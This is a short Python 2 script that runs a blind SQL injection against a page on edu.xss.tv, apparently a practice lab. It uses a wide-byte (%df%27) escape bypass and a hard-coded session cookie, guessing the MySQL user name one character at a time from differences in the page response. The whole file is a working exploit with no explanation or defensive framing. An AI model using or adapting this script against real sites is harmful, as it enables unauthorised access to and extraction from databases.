#codind:gb2312

import sys
import httplib
import urllib

header = {	'Host': 'edu.xss.tv',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
			'Cookie': 'Hm_lvt_e5efb7047a682ed4bd398034a6316c5e=1500722638; __cfduid=d0672c891f9f5f300118bc70e80b073ff1500722631; Hm_lpvt_e5efb7047a682ed4bd398034a6316c5e=1500722991; PHPSESSID=7dt7nnh0c2el942pln9nubqdu6',
			'Connection': 'keep-alive'
			}

payloads = list('abcdefghijklmnopqrstuvwxyz1234567890@_\/.*')

user = ''

for i in range(1,25):
	for payload in payloads:
		s = "/payload/sql/wide.php?id=1%%df%%27 and+(select ascii(substr(user(),%s,1)))=%c%%23" %(i,ord(payload))
		conn = httplib.HTTPConnection('edu.xss.tv',timeout=5)
		conn.request(method='GET',url=s,headers= header)
		r = conn.getresponse().read()
		conn.close()
		print r
		if 'email' in r :
			user += payload
			sys.stdout.write('\n[*]'+user)
			break
print '\n [Done] Mysql user is :%s' %user